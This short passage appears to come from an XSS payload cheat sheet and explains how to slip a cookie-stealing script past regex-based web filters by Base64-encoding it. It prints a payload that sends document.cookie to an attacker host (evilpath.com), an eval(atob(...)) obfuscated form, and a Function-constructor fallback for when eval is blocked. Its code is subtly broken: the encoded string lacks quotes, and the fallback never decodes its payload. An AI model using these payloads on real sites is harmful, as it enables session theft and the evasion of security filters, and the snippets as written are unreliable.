Most web application uses a Regex-based filtering system that searches for malicious strings. A possible way to escape/evade these type of filters is by using Base64 encoding.

For example, the following payload will be detected by the filtering system, because `document.cookie` may be a sign that someone is attempting to steal a cookie:
```txt
location.href = 'http://evilpath.com/?c='+escape(document.cookie)
```

Using Base64 encoding, we can hide `document.cookie`
code translating the payload into:
```txt
eval(atob(bG9jYXRpb24uaHJlZiA9ICdodHRwOi8vZXZpbHBhdGguY29tLz9jPScrZXNjYXBlKGRvY3VtZW50LmNvb2tpZSk=))
```

In the event the `eval` function is blacklisted, the following functions can be used as an alternative:
- `[].constructor.constructor('BASE_64_ENCODED_PAYLOAD')()`